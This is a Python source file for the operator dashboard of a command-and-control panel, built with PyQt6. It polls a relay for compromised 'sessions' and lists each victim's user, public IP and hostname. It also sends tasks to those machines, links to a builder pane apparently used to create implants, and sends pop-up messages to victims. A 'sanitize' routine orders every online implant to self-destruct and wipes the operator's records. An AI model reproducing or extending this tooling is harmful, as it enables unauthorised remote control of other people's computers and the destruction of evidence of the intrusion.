# ui/dashboard_window.py
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QSplitter, QTableWidget, QVBoxLayout, 
                             QLabel, QHeaderView, QTableWidgetItem, QMenu, QInputDialog,
                             QPushButton)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer
from PyQt6.QtGui import QAction
import requests, uuid
from .builder_pane import BuilderPane
from .options_pane import OptionsPane
from config import RELAY_URL

class DashboardWindow(QWidget):
    build_requested = pyqtSignal(dict)
    sign_out_requested = pyqtSignal()
    setting_changed = pyqtSignal(str, object)
    session_interact_requested = pyqtSignal(str)
    response_received = pyqtSignal(str, dict)

    def __init__(self, db_manager, username):
        super().__init__()
        self.db = db_manager
        self.username = username
        self.sessions = {}

        main_layout = QHBoxLayout(self)
        self.splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(self.splitter)

        self.builder_pane = BuilderPane(db_manager) 
        self.builder_pane.build_requested.connect(self.build_requested)
        
        self.sessions_pane = QWidget()
        sessions_layout = QVBoxLayout(self.sessions_pane)
        sessions_layout.setContentsMargins(10,10,10,10)
        sessions_layout.addWidget(QLabel("<h2>SESSIONS</h2>"))
        
        self.session_table = QTableWidget()
        self.session_table.setColumnCount(6)
        self.session_table.setHorizontalHeaderLabels(["Status", "User", "Public IP", "Host Name", "Session ID", "Open"])
        self.session_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.session_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        
        header = self.session_table.horizontalHeader()
        header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed)
        header.resizeSection(0, 120)
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.Fixed)
        header.resizeSection(5, 120)
        header.setStretchLastSection(False)
        self.splitter.setStretchFactor(1, 2)
        
        self.session_table.verticalHeader().setVisible(False)
        self.session_table.setSortingEnabled(True)
        self.session_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.session_table.customContextMenuRequested.connect(self.show_session_context_menu)
        
        sessions_layout.addWidget(self.session_table)
        
        self.options_pane = OptionsPane(db_manager)
        self.options_pane.sign_out_requested.connect(self.sign_out_requested)
        self.options_pane.sanitize_requested.connect(self.handle_sanitize)
        self.options_pane.setting_changed.connect(self.setting_changed)
        self.options_pane.panel_reset_requested.connect(self.reset_panel_sizes)
        
        self.splitter.addWidget(self.builder_pane)
        self.splitter.addWidget(self.sessions_pane)
        self.splitter.addWidget(self.options_pane)
        self.reset_panel_sizes()

        self.poll_timer = QTimer(self)
        self.poll_timer.timeout.connect(self.poll_relay)
        self.start_polling()

    def start_polling(self):
        self.sessions = self.db.load_all_sessions_for_user(self.username)
        self.update_session_table(self.sessions)
        self.poll_timer.start(3000)

    def stop_polling(self):
        self.poll_timer.stop()

    def poll_relay(self):
        try:
            response = requests.get(f"{RELAY_URL}/c2/poll/{self.username}", timeout=10)
            if response.status_code == 200:
                polled_data = response.json()
                live_data = polled_data.get("sessions", {})

                new_session_state = self.db.load_all_sessions_for_user(self.username)
                for sid in new_session_state:
                    new_session_state[sid]['status'] = 'Offline'
                
                for session_id, data in live_data.items():
                    new_session_state[session_id] = data
                    new_session_state[session_id]['status'] = 'Online'

                if new_session_state != self.sessions:
                    self.sessions = new_session_state
                    self.db.save_all_sessions_for_user(self.username, self.sessions)
                    self.update_session_table(self.sessions)
                    
                for response_data in polled_data.get("responses", []):
                    session_id = response_data.get("session_id")
                    self.response_received.emit(session_id, response_data.get("result", {}))
        except requests.RequestException:
            if any(s.get('status') == 'Online' for s in self.sessions.values()):
                for sid in self.sessions: self.sessions[sid]['status'] = 'Offline'
                self.update_session_table(self.sessions)

    def send_task(self, session_id, task):
        try:
            payload = {"session_id": session_id, "command": task}
            requests.post(f"{RELAY_URL}/c2/task", json=payload, timeout=10)
        except requests.RequestException:
            pass

    def handle_sanitize(self):
        online_sessions = [sid for sid, data in self.sessions.items() if data.get('status') == 'Online']
        if online_sessions:
            self_destruct_command = { "action": "self_destruct", "params": {} }
            for session_id in online_sessions:
                self.send_task(session_id, self_destruct_command)
        self.db.sanitize_all_data(self.username)
        self.sessions.clear()
        self.update_session_table({})

    def reset_panel_sizes(self):
        self.splitter.setSizes([400, 800, 250])

    def update_session_table(self, sessions_data):
        self.session_table.setSortingEnabled(False)
        self.session_table.setRowCount(0)
        self.session_table.setRowCount(len(sessions_data))
        
        for row, (session_id, data) in enumerate(sessions_data.items()):
            status = data.get('status', 'Offline')

            status_widget_container = QWidget()
            status_layout = QHBoxLayout(status_widget_container)
            status_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
            status_layout.setContentsMargins(5, 5, 5, 5)
            status_label = QLabel(status.upper())
            status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            status_label.setObjectName("StatusLabel")
            status_label.setProperty("status", "online" if status == "Online" else "offline")
            status_layout.addWidget(status_label)
            self.session_table.setCellWidget(row, 0, status_widget_container)
            
            metadata = data.get('metadata', {})
            self.session_table.setItem(row, 1, QTableWidgetItem(metadata.get('user', 'N/A')))
            self.session_table.setItem(row, 2, QTableWidgetItem(metadata.get('ip', 'N/A')))
            self.session_table.setItem(row, 3, QTableWidgetItem(metadata.get('hostname', 'N/A')))
            self.session_table.setItem(row, 4, QTableWidgetItem(session_id))
            
            interact_button = QPushButton("Interact")
            interact_button.setObjectName("InteractButton")
            interact_button.clicked.connect(lambda checked, sid=session_id: self.session_interact_requested.emit(sid))
            self.session_table.setCellWidget(row, 5, interact_button)
            
        self.session_table.setSortingEnabled(True)

    def show_session_context_menu(self, pos):
        item = self.session_table.itemAt(pos)
        if not item: return
        session_id = self.session_table.item(item.row(), 4).text()
        menu = QMenu()
        popup_action = menu.addAction("Send Popup Message")
        action = menu.exec(self.session_table.mapToGlobal(pos))
        if action == popup_action:
            text, ok = QInputDialog.getText(self, 'Send Popup', 'Enter message:')
            if ok and text:
                command = { "action": "popup", "params": {"title": "Message from C2", "message": text} }
                self.send_task(session_id, command)